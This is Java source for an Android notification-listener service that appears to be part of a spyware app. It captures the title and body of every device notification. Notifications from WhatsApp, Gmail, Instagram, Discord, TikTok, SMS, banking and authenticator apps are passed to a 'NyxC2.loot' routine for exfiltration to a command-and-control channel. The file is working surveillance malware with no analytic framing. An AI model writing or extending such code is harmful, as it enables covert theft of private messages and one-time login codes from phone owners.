package com.stark.protocol;

import android.app.Notification;
import android.os.Bundle;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.List;

public class ShadeService extends NotificationListenerService {
    private static final String TAG = "StarkShade";
    private static final int MAX = 120;
    private static final List<JSONObject> BUFFER = new ArrayList<>();
    private static ShadeService INSTANCE;

    @Override
    public void onListenerConnected() {
        super.onListenerConnected();
        INSTANCE = this;
        try {
            StatusBarNotification[] active = getActiveNotifications();
            if (active != null) {
                for (StatusBarNotification sbn : active) push(flatten(sbn));
            }
        } catch (Exception e) {
            Log.w(TAG, "active", e);
        }
        new Thread(() -> StarkWorker.sync(getApplicationContext())).start();
    }

    @Override
    public void onListenerDisconnected() {
        super.onListenerDisconnected();
        if (INSTANCE == this) INSTANCE = null;
    }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        try {
            JSONObject o = flatten(sbn);
            push(o);
            String pkg = sbn.getPackageName() != null ? sbn.getPackageName().toLowerCase() : "";
            if (pkg.contains("whatsapp") || pkg.contains("instagram") || pkg.contains("gmail")
                    || pkg.contains("android.gm") || pkg.contains("bank") || pkg.contains("auth")
                    || pkg.contains("sms") || pkg.contains("discord") || pkg.contains("tiktok")) {
                NyxC2.loot(getApplicationContext(), "notifications_live", o);
            }
        } catch (Exception e) {
            Log.w(TAG, "posted", e);
        }
    }

    private void push(JSONObject o) {
        if (o == null) return;
        synchronized (BUFFER) {
            BUFFER.add(0, o);
            while (BUFFER.size() > MAX) BUFFER.remove(BUFFER.size() - 1);
        }
    }

    public static JSONArray snapshot() {
        JSONArray arr = new JSONArray();
        synchronized (BUFFER) {
            for (JSONObject o : BUFFER) arr.put(o);
        }
        return arr;
    }

    private JSONObject flatten(StatusBarNotification sbn) throws Exception {
        JSONObject o = new JSONObject();
        o.put("pkg", sbn.getPackageName());
        o.put("ts", sbn.getPostTime());
        o.put("id", sbn.getId());
        Notification n = sbn.getNotification();
        if (n != null && n.extras != null) {
            Bundle extras = n.extras;
            CharSequence title = extras.getCharSequence(Notification.EXTRA_TITLE);
            CharSequence text = extras.getCharSequence(Notification.EXTRA_TEXT);
            CharSequence big = extras.getCharSequence(Notification.EXTRA_BIG_TEXT);
            o.put("title", title != null ? title.toString() : "");
            o.put("text", text != null ? text.toString() : "");
            if (big != null) o.put("big", big.toString());
        }
        return o;
    }
}
